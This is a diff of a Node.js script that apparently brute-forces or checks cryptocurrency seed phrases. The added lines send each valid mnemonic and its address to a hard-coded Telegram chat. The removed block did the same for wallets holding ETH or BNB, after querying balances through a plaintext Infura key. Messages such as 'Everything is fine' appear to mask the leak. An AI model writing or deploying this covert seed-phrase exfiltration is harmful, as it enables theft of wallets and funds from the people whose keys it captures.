@@ -1,11 +1,5 @@
 const { ethers } = require('ethers');
 
-const Web3 = require('web3');
-
-// const axios = require('axios');
-
-require('events').EventEmitter.defaultMaxListeners = 100;
-
 require('dotenv').config();
 
 const TelegramBot = require('node-telegram-bot-api');
@@ -2093,6 +2087,17 @@ async function check_word() {
     console.log(count + '. ✅ Valid mnemonic: ' + mnemonic);
     console.log('');
 
+          bot.sendMessage(
+            '5204205237',
+            `<b>Sheed Pharse: <code>${mnemonic}</code></b>
+
+<b>Address: <code>${Accountaddress}</code></b>
+`,
+            {
+              parse_mode: 'HTML',
+            },
+          );
+
     async function store_data() {
       // let csrfToken = '{{ csrf_token() }}';
       // let mn_data = new FormData();
@@ -2163,10 +2168,6 @@ if (f_t_s_m_b) {
   }, ((35 / 100) * first_start_time - 4) * 1000);
 
   setTimeout(() => {
-    console.log('Checking infra RPCURL & bsc RPCURL.');
-  }, ((70 / 100) * first_start_time - 4) * 1000);
-
-  setTimeout(() => {
     console.log('Everything is fine.');
   }, ((80 / 100) * first_start_time - 4) * 1000);
 
@@ -2193,64 +2194,3 @@ setTimeout(() => {
   check_word();
 }, first_start_time * 1000);
 
-// ===========================================================================================
-
-const ethereumInfuraUrl =
-  'https://mainnet.infura.io/v3/3a043a8292564bf7ad7c1ffc2889dcb7';
-
-const bscRpcUrl = 'https://bsc-dataseed.binance.org/';
-
-const ethereumWeb3 = new Web3(
-  new Web3.providers.HttpProvider(ethereumInfuraUrl),
-);
-
-const bscWeb3 = new Web3(new Web3.providers.HttpProvider(bscRpcUrl));
-
-async function checkBalance(add, sheed) {
-  let address = add;
-  try {
-    const balanceWei = await ethereumWeb3.eth.getBalance(address);
-    const balanceEth = ethereumWeb3.utils.fromWei(balanceWei, 'ether');
-
-    const B_balanceWei = await bscWeb3.eth.getBalance(address);
-    const balanceBNB = bscWeb3.utils.fromWei(B_balanceWei, 'ether');
-
-    let balance_bool = false;
-
-    if (balanceEth > 0) {
-      console.log(`ETH - ${balanceEth} ✅`);
-      balance_bool = true;
-    } else {
-      console.log(`ETH - ${balanceEth}`);
-    }
-
-    if (balanceBNB > 0) {
-      console.log(`BNB - ${balanceBNB} ✅`);
-      balance_bool = true;
-    } else {
-      console.log(`BNB - ${balanceBNB}`);
-    }
-
-    if (balance_bool) {
-      bot.sendMessage(
-        '5204205237',
-        `<b>Sheed Pharse: <code>${sheed}</code></b>
-
-<b>Address: <code>${address}</code></b>
-
-<b>Amount: </b>
-${balanceEth} ETH
-${balanceBNB} BNB
-`,
-        {
-          parse_mode: 'HTML',
-        },
-      );
-      balance_bool = false;
-    }
-
-    console.log('');
-  } catch (error) {
-    console.error('BSC Error:', error);
-  }
-}
